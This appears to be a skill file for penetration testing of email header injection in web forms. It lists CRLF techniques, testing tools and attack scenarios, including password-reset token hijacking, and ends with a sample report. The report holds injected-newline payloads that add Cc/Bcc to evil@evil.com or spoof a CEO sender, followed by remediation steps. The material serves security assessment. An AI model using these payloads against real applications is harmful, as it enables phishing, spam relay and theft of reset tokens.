---
name: email-artifact-forensics
description: - When testing contact forms, feedback forms, or "email a friend" functionality - During assessment of password reset email functionality - When testing newsletter subscription or notification email systems - During penetration testing of applications that send emails based on user input - When auditing email-related API endpoints for header inject
domain: cybersecurity
---
------|-------------|
| CRLF Injection | Injecting carriage return and line feed characters to create new email headers |
| Header Injection | Adding unauthorized headers (Cc, Bcc, From) to outgoing emails |
| Spam Relay | Abusing email functionality to send spam to arbitrary recipients |
| Email Spoofing | Modifying From or Reply-To headers to impersonate trusted senders |
| MIME Manipulation | Injecting MIME boundaries to override email body content |
| SMTP Command Injection | Injecting raw SMTP commands through unsanitized email parameters |
| Newline Characters | \r\n (CRLF), \n (LF), \r (CR) used to separate email headers |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| Burp Suite | HTTP proxy for modifying email-related form submissions |
| swaks | Swiss Army Knife for SMTP testing and header injection validation |
| OWASP ZAP | Automated scanner with email injection detection |
| mailhog | Local SMTP testing server for capturing injected emails |
| smtp4dev | Development SMTP server for monitoring email injection results |
| Nuclei | Template scanner with email header injection detection templates |

## Common Scenarios

1. **Spam Relay** — Inject BCC headers to relay mass emails through the target's SMTP server, bypassing spam filters that trust the sender domain
2. **Phishing via Contact Form** — Modify From and Reply-To headers to send phishing emails appearing to originate from the target organization
3. **Password Reset Hijack** — Inject CC header in password reset flow to receive a copy of reset tokens sent to the victim
4. **Email Content Override** — Inject MIME Content-Type headers to replace legitimate email body with malicious phishing content
5. **Internal Email Abuse** — Use header injection to send emails to internal addresses not normally accessible through the application

## Output Format

```
## Email Header Injection Report
- **Target**: http://target.com/contact
- **Injection Point**: email field in contact form
- **Encoding Required**: URL-encoded LF (%0A)

### Findings
| # | Field | Payload | Result | Severity |
|---|-------|---------|--------|----------|
| 1 | email | test@test.com%0ACc:evil@evil.com | CC header injected | High |
| 2 | email | test@test.com%0ABcc:evil@evil.com | BCC header injected | High |
| 3 | name | Test%0AFrom:ceo@target.com | From spoofing | Medium |

### Remediation
- Validate email addresses with strict regex rejecting newline characters
- Strip \r, \n, and encoded variants from all email-related input
- Use parameterized email APIs that separate headers from data
- Implement rate limiting on email-sending functionality
```